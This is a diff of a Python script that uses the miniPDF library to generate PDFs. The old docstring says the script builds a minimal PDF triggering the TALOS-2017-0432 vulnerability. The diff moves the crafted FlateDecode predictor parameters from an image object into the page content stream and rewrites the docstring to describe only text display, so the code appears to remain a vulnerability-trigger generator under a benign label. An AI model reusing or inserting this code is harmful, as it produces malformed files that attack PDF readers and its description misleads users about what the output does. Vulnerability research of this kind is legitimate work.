@@ -1,10 +1,10 @@
 #! /usr/bin/env python
 #More info at http://github.com/feliam/miniPDF
 '''
-Make a minimal PDF triggering https://www.talosintelligence.com/reports/TALOS-2017-0432
+Make a minimal PDF file displaying some text.
 '''
 import sys, StringIO
-from minipdf import PDFDoc, PDFName, PDFNum, PDFString, PDFRef, PDFStream, PDFDict, PDFArray, PDFBool
+from minipdf import PDFDoc, PDFName, PDFNum, PDFString, PDFRef, PDFStream, PDFDict, PDFArray
 
 import optparse
 parser = optparse.OptionParser(usage="%prog [options] [TEXT]", description=__doc__)
@@ -29,33 +29,6 @@ else:
 #The document
 doc = PDFDoc()
 
-_width = 10
-_height = 10
-decodeparams = PDFDict()
-decodeparams['Columns'] = PDFNum(2)
-decodeparams['Colors'] = PDFNum(1)
-decodeparams['BitsPerComponent'] = PDFNum(16)
-decodeparams['Predictor'] = PDFNum(2)
-
-#decodeparams['K'] = PDFNum(0x3fffffff-4)
-#decodeparams['Rows'] = PDFNum(0)
-#decodeparams['EndOfLine'] = PDFBool(False)
-#decodeparams['EncodedByteAlign'] = PDFBool(False)
-#decodeparams['EndOfBlock'] = PDFBool(True)
-#decodeparams['BlackIs1'] = PDFBool(False)
-
-
-xobj = PDFStream("z"*100 )#file(sys.argv[1]).read())
-xobj['Type'] = PDFName('XObject')
-xobj['Subtype'] = PDFName('Image')
-xobj['Width'] = PDFNum(_width)
-xobj['Height'] = PDFNum(_height)
-xobj['ColorSpace'] = PDFName('DeviceRGB')
-xobj['Filter'] = PDFName('FlateDecode')
-xobj['W'] = PDFArray( [PDFNum(0),PDFNum(0),PDFNum(0)] )
-xobj['DecodeParms'] = decodeparams
-
-doc+= xobj
 #font
 font = PDFDict()
 font['Name'] = PDFName('F1')
@@ -72,12 +45,16 @@ resources['Font'] = fontname
 doc += resources
 
 #contents
-contents = PDFStream('''BT 
-/F1 24 Tf 0 700 Td 
-%s Tj 
-ET
-'''%PDFString(file_input.read()))
+contents = PDFStream((file_input.read()).encode('zlib') )
 doc += contents
+
+contents['Filter'] = PDFName('FlateDecode')
+decodeparams = PDFDict()
+decodeparams['Columns'] = PDFNum(2)
+decodeparams['Colors'] = PDFNum(1)
+decodeparams['BitsPerComponent'] = PDFNum(16)
+decodeparams['Predictor'] = PDFNum(2)
+contents['DecodeParms'] = decodeparams
 
 #page
 page = PDFDict()
